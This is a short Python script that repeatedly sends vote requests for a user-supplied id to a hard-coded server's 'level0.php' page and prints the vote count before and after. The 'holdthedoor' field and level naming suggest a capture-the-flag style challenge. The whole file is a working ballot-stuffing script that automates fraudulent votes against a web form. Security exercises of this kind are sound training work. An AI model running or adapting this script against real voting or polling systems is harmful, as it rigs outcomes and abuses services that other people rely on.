#!/usr/bin/python3
import requests
from  functions import fetch_vote_count
import re

userid = input("Enter userid to vote for:")
vote_limit = int(input("Enter number of times to vote: "))
payload = {
    'id': userid,
    'holdthedoor': 'Submit+Query'
}
start_votes = fetch_vote_count(userid)
print("Votes before run: {:s}".format(start_votes))
print("Voting {:d} times".format(vote_limit))

for i in range(0,vote_limit):
    print(i+1)
    r = requests.post("http://54.221.6.249/level0.php", data=payload)

end_votes = fetch_vote_count(userid)
print("Starting votes: {:s}".format(start_votes))
print("Ending votes: {:s}".format(end_votes))
